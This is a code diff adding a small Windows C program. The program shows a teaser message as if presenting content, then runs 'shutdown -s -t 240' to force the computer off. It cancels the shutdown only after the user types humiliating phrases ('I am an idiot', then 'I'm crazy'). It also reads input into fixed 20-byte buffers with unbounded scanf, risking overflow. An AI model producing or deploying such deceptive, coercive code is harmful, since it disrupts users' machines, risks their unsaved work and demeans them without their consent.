@@ -1,0 +1,32 @@
+#include<stdio.h>
+#include<string.h>
+#include<windows.h>
+#include<stdlib.h>
+int main()
+{
+	int x;
+	char INPUT[20]="0", ANSER[20]="我是傻子";
+	printf("##***精彩内容即将呈现***##");
+	Sleep(500);
+	system("cls");
+	printf("你的电脑即将关机，请输入'我是傻子'取消指令!\n");
+	system("shutdown -s -t 240");
+again:
+	scanf("%s", INPUT);
+	if (strcmp(INPUT, ANSER) == 0)
+		printf("你被骗了,可没那么简单，应该说'我疯了'才行哦!");
+	else
+	{
+		printf("快要关机了，快点哦!\n");
+		goto again;
+	}
+	strcpy(ANSER, "我疯了");
+	scanf("%s", INPUT);
+	if (strcmp(INPUT, ANSER) == 0)
+		system("shutdown -a");
+	else
+	{
+		printf("快要关机了，快点哦!\n");
+		goto again;
+	}
+}
